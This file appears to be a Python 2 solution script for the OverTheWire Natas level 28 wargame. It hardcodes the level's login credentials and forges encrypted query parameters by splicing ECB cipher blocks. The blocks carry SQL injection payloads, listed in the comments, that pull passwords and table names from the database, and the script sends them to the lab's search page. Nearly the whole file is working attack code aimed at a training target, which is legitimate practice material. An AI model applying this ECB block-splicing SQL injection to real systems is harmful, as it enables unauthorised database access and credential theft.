import requests
import string
import urllib
import sys
import base64





target = 'http://natas28.natas.labs.overthewire.org/index.php'
target2 = 'http://natas28.natas.labs.overthewire.org/search.php' 


user_auth = ('natas28', 'JWwR438wkgTsNKBbcJoowyysdM82YjeF')


tar = ['''
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2

f98d3394bd37ee877f0c4d86f715196d

49c7ba5914897b2f40efe9c311888865
043003a0d0e6d1e3c6e068f0ce764453
03c7ef5bbf2ddabdbe475c48ab5a8f65

7b7baca655f298a321e90e3f7a60d4d8
''']



#IKE '%padpadpa%'| OR 1 = 3 + 2 -4|UNION SELECT tab|le_name FROM inf|ormation_schema.|tables;         |;
#IKE '%padpadpa%'| OR 1 = 3 + 2 -4|UNION SELECT COU|NT(*) FROM infor|mation_schema.ta|bles;           |;
#IKE '%padpadpa%'| OR 1 = 3 + 2 -4|UNION SELECT pas|sword FROM users|;
#IKE '%padpadpa%'| OR 1 = 3 + 2 -4|UNION ALL SELECT| password FROM u|sers;           |                |;
#IKE '%padpadpa%'| OR 1 = 3 + 2 -4|UNION ALL SELECT| user();        |;
#IKE '%padpadpa%'| OR 1 = 3 + 2 -4|UNION SELECT COU|NT(*) FROM users|;
#IKE '%padpadpa%'| OR 1 = 3 + 2 -4| AND EXISTS(SELE|CT COUNT(*) FROM| users)         |;
#IKE '%padpadpa%'| AND EXISTS(SELE|CT * FROM users)|;
#IKE '%padpadpa%'| OR EXISTS(SELEC|T * FROM users) |;
#IKE '%padpadpa%'| OR EXISTS(SELEC|T password FROM |users)          |;
#IKE '%padpadpa%'| UNION SELECT pa|ssword FROM user|s               |;
#IKE '%padpadpa%'| UNION SELECT pa|ssword, 1 FROM u|sers            |;
#IKE '%padpadpa%'| UNION SELECT pa|ssword, 1, 1 FRO|M users         |;
#IKE '%padpadpa%'| UNION SELECT pa|ssword, 1, 1, 1 |FROM users      |;
#IKE '%padpadpa%'| UNION SELECT pa|ssword, 1, 1, 1,| 1 FROM users   |;
#IKE '%padpadpa%'| UNION SELECT pa|ssword, 1, 1, 1,| 1, 1 FROM users|;
#IKE '%padpadpa%'| UNION SELECT pa|ssword FROM user|s               |;


#49c7ba5914897b2f40efe9c311888865
#3e315a11ea3768070789991e7c408a9f
#f9f1e6f1fce2156d9bf85b89081cb5e7


#49c7ba5914897b2f40efe9c311888865  +1
#efd64826ce62fa4cd616ab6b18bad117
#cf67cd1c8aaff7e9805c0c21accb1eee



#49c7ba5914897b2f40efe9c311888865   UNION SELECT password FROM users
#043003a0d0e6d1e3c6e068f0ce764453
#03c7ef5bbf2ddabdbe475c48ab5a8f65



#1f6474566c452791c6685080ab9fed5e   SELECT PASSWORD Exists
#8dd4afcc52d19b0d062c9434d0fa3201
#b57395ede21f5009d361226c3f2513a0



#3d546496ca2c78592a18c77ac4af154e   AND EXISTS users
#402f24b7f49c1983b0073acdd9831b51


#1f6474566c452791c6685080ab9fed5e   OR EXISTS users
#90f7f7a0a96707167e524690fec2646c


#3d546496ca2c78592a18c77ac4af154e  AND EXISTS users
#d041d67b37acc675346f5fa833ed46b7
#51326a78af26aff9af48d7f4ae451753




#878376e1154ea2c894cd4595012e9892   UNION SELECT COUNT(*) FROM users
#62abd996e902989e699fa8b3451751cb


#878376e1154ea2c894cd4595012e9892   counting the info schema
#16fd3fba61290de4a735f7a325b38f2c
#79662965294bf1e7629d47747d2f59de
#37de8c9c82641722a8718d1aeda7d89d



#93895338816194062c71754ad6d1df41   UNION ALL SELECT user();
#a3ec9165d86cbdd0c500b021d400d77c



#93895338816194062c71754ad6d1df41  UNION ALL SELECT
#0ee5cc48ac3c41e62ca4bc05560b2dde
#319e61c51123e8daaa22b0661ea3271e
#d5050689855a82236b49b4218c56dd47






#41fcf2b914a637c1c0bc33fccca100c7 UNION SELECT etc etc
#afe5538c3d8ef49190de80fd6d7c9917
#3b706654b398689afd80d4e7902e0913
#b9d9a0a06cbc1fdb575627e6bbd4a6cd



#5599905fe8629674a548cd478ea2bc0f select table name etc etc.
#dd79291bbbdbba7e36ef341340d147a4
#f159a8362e23a7745f71f5ce42e0a7e6



#b433143af7e48cc3ecaf84830f2fb292   " OR 1 =1 OR 2= 2"
#8ceff91cc4258ab898a50e89c598be19   " OR 1 =1 OR 2=2;"
#f98d3394bd37ee877f0c4d86f715196d   "IKE '%padpadp%' "
#739c0e02884d8c5dc1da136f9e554542   "IKE '%padpadpa%'"
#ea6e17a31472ca9f6be0f7e0e0261b08   " OR 1 = 3 + 2 -4"
#d8ae51d7da71b2b083d919a0d7b88b98   16 * 0x16
#b734aa0c92ed6cfb8abb2375a4ea8114   "IKE '% OR 1 = 1' 
#7b7baca655f298a321e90e3f7a60d4d8   ";" + 15 * 0x15


for i in range(0, len(tar)):
    tar[i] = tar[i].replace("\n", "").strip()


print tar

# notes
# 42 bytes IV?
# 22 bytes blocks
# 44 bytes padding   
# going beyond target length [0, 6], 22 bytes are added to IV
# another 1st block length increase after [7, 14]

# going beyond target length [0, 8], 20 bytes are added in total length
# seems like every 8 length, total length increases. this time by 24 bytes
# seems to alternate between 20 and 24 bytes addition
header = {'Content-Type': 'application/x-www-form-urlencoded'}

for i in range(0, len(tar)):
    hexhold = ''
    temptarray = []

    temptarray = [chr(int(tar[i][j:j+2], 16)) for j in range(0, len(tar[i]),2)]
    print temptarray

    temptar = urllib.quote_plus(base64.b64encode("".join(temptarray)))
    print temptar
    print base64.b64encode("".join(temptarray))


    #payload = {'query':'tar[i]'}
    payload = 'query=%s' % temptar

    #print payload
    #response = requests.post(target, auth = user_auth, data = payload, allow_redirects = True)
    response = requests.get(target2 + "/?" + payload, auth = user_auth, headers = header, allow_redirects = True)
    print(response.text)
    #for rehist in response.history:
#print rehist.status_code, rehist.url
    #query = str.split(response.url.encode('ascii','ignore'), '=')
    #print(query)
    #print(tar[i].ljust(3)),
    #currstr = base64.b64decode(urllib.unquote(query[1]))
    #print '-'*60 
    #print(decodeNatas(currstr))
    #print(urllib.unquote(tar[i]))
    #print '-'* 60
    

    #print(len((base64.b64decode(urllib.unquote(query[1])))))
    
    




    # compare the strings
    if 1 == 0:
        for index, bitchar in enumerate(laststr):
            if bitchar == currstr[index]:
                sys.stdout.write('_')
            else:
                sys.stdout.write('*')
        sys.stdout.flush()
        print " ",
        laststr = base64.b64decode(urllib.unquote(query[1]))

    
    #print(urllib.unquote(query[1])),
    #print(urllib.unquote(tar[i]).rjust(2))
